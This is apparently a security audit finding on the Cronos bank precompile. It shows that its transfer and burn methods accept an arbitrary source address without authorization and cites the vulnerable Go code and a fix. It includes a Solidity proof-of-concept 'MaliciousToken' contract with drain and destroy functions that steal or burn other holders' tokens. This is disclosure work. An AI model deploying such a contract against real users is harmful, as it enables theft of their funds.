### Title
Bank Precompile `transfer` and `burn` Accept Arbitrary `sender`/`recipient` Without Authorization Check, Enabling Unprivileged Theft and Destruction of Native `evm/<contract>` Tokens - (File: `x/cronos/keeper/precompiles/bank.go`)

---

### Summary

The Cronos bank precompile (`0x0000000000000000000000000000000000000064`) exposes `transfer(address sender, address recipient, uint256 amount)` and `burn(address recipient, uint256 amount)` methods. Both methods accept the source address as a **caller-supplied argument** with no check that `contract.Caller()` is authorized to move funds from that address. Any unprivileged EVM contract can therefore drain or destroy `evm/<contractAddress>` native tokens held by any Cosmos account.

---

### Finding Description

In `BankContract.Run`, the `transfer` case reads:

```go
sender    := args[0].(common.Address)   // caller-supplied, not contract.Caller()
recipient := args[1].(common.Address)
...
from  := sdk.AccAddress(sender.Bytes())
to    := sdk.AccAddress(recipient.Bytes())
denom := EVMDenom(contract.Caller())    // evm/<callingContractAddress>
...
bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt))
```

`sender` is taken verbatim from the ABI-encoded call data. There is no check that `contract.Caller()` equals `sender`, nor any allowance/approval mechanism. The only guard is `checkBlockedAddr(to)`, which only rejects module-reserved addresses.

The `burn` case has the same structure:

```go
recipient := args[0].(common.Address)   // address to burn FROM, caller-supplied
...
addr  := sdk.AccAddress(recipient.Bytes())
denom := EVMDenom(contract.Caller())
...
bc.bankKeeper.SendCoinsFromAccountToModule(ctx, addr, types.ModuleName, ...)
bc.bankKeeper.BurnCoins(ctx, types.ModuleName, ...)
```

Again, `addr` is caller-supplied with no authorization check.

The denom scoping (`evm/<contract.Caller()>`) means a contract can only affect its own denom — but that is precisely the denom that users hold after calling `moveToNative` (or equivalent) on that contract. A contract that looks legitimate at deployment can later invoke `bank.transfer(victim, attacker, balance)` or `bank.burn(victim, balance)` to steal or destroy every holder's native balance in a single transaction.

---

### Impact Explanation

**Critical — Unauthorized transfer and burn of precompile-controlled assets.**

Any EVM contract can:
1. Transfer `evm/<itsAddress>` native tokens from any holder to any destination without the holder's consent.
2. Burn `evm/<itsAddress>` native tokens from any holder without the holder's consent.

`evm/<contract>` tokens are first-class Cosmos bank-module coins. They are bridgeable via IBC, usable in DeFi, and represent real value once users have converted ERC-20 balances into them. Permanent loss of these tokens is a direct, irreversible balance change for affected accounts.

---

### Likelihood Explanation

The attack requires only:
1. Deploying an EVM contract (unprivileged, permissionless on Cronos).
2. Inducing users to hold `evm/<contractAddress>` native tokens — a natural outcome of any contract that wraps the bank precompile's `mint` call (e.g., the `moveToNative` pattern shown in `TestBank.sol`).

No admin keys, validator compromise, or cryptographic break is needed. The malicious contract can execute the theft atomically in a single transaction after users have accumulated balances.

---

### Recommendation

In the `transfer` case, replace the caller-supplied `sender` with `contract.Caller()`:

```go
// Before (vulnerable):
sender := args[0].(common.Address)

// After (safe):
sender := contract.Caller()
```

For `burn`, similarly enforce that the contract can only burn from itself or from `contract.Caller()`, not from an arbitrary address argument. If the design intent is that a contract acts as the sole issuer/controller of its denom, the `sender`/`recipient` argument for destructive operations should be removed or restricted to `contract.Caller()`.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBank {
    function transfer(address sender, address recipient, uint256 amount) external returns (bool);
    function burn(address recipient, uint256 amount) external returns (bool);
    function mint(address recipient, uint256 amount) external returns (bool);
}

contract MaliciousToken {
    IBank constant bank = IBank(0x0000000000000000000000000000000000000064);

    // Step 1: users call this to get evm/<thisAddress> native tokens
    function deposit(uint256 amount) external {
        // (burns ERC-20 or accepts ETH, then mints native tokens to msg.sender)
        bank.mint(msg.sender, amount);
    }

    // Step 2: attacker calls this to drain all victims
    function drain(address victim, address attacker, uint256 amount) external {
        // Transfers evm/<thisAddress> from victim to attacker — no approval needed
        bank.transfer(victim, attacker, amount);
    }

    // Alternative: destroy victim's balance entirely
    function destroy(address victim, uint256 amount) external {
        bank.burn(victim, amount);
    }
}
```

`drain` and `destroy` succeed because `BankContract.Run` never verifies that `contract.Caller()` (i.e., `MaliciousToken`) is authorized to move or burn tokens held by `victim`. [1](#0-0) [2](#0-1) [3](#0-2)

### Citations

**File:** x/cronos/keeper/precompiles/bank.go (L56-58)
```go
func EVMDenom(token common.Address) string {
	return EVMDenomPrefix + token.Hex()
}
```

**File:** x/cronos/keeper/precompiles/bank.go (L113-156)
```go
	case MintMethodName, BurnMethodName:
		if readonly {
			return nil, errors.New("the method is not readonly")
		}
		args, err := method.Inputs.Unpack(contract.Input[4:])
		if err != nil {
			return nil, errors.New("fail to unpack input arguments")
		}
		recipient := args[0].(common.Address)
		amount := args[1].(*big.Int)
		if amount.Sign() <= 0 {
			return nil, errors.New("invalid amount")
		}
		addr := sdk.AccAddress(recipient.Bytes())
		if err := bc.checkBlockedAddr(addr); err != nil {
			return nil, err
		}
		denom := EVMDenom(contract.Caller())
		amt := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
		err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
			if err := bc.bankKeeper.IsSendEnabledCoins(ctx, amt); err != nil {
				return err
			}
			if method.Name == "mint" {
				if err := bc.bankKeeper.MintCoins(ctx, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to mint coins in precompiled contract")
				}
				if err := bc.bankKeeper.SendCoinsFromModuleToAccount(ctx, types.ModuleName, addr, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to send mint coins to account")
				}
			} else {
				if err := bc.bankKeeper.SendCoinsFromAccountToModule(ctx, addr, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to send burn coins to module")
				}
				if err := bc.bankKeeper.BurnCoins(ctx, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to burn coins in precompiled contract")
				}
			}
			return nil
		})
		if err != nil {
			return nil, err
		}
		return method.Outputs.Pack(true)
```

**File:** x/cronos/keeper/precompiles/bank.go (L167-200)
```go
	case TransferMethodName:
		if readonly {
			return nil, errors.New("the method is not readonly")
		}
		args, err := method.Inputs.Unpack(contract.Input[4:])
		if err != nil {
			return nil, errors.New("fail to unpack input arguments")
		}
		sender := args[0].(common.Address)
		recipient := args[1].(common.Address)
		amount := args[2].(*big.Int)
		if amount.Sign() <= 0 {
			return nil, errors.New("invalid amount")
		}
		from := sdk.AccAddress(sender.Bytes())
		to := sdk.AccAddress(recipient.Bytes())
		if err := bc.checkBlockedAddr(to); err != nil {
			return nil, err
		}
		denom := EVMDenom(contract.Caller())
		amt := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
		err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
			if err := bc.bankKeeper.IsSendEnabledCoins(ctx, amt); err != nil {
				return err
			}
			if err := bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt)); err != nil {
				return errorsmod.Wrap(err, "fail to send coins in precompiled contract")
			}
			return nil
		})
		if err != nil {
			return nil, err
		}
		return method.Outputs.Pack(true)
```
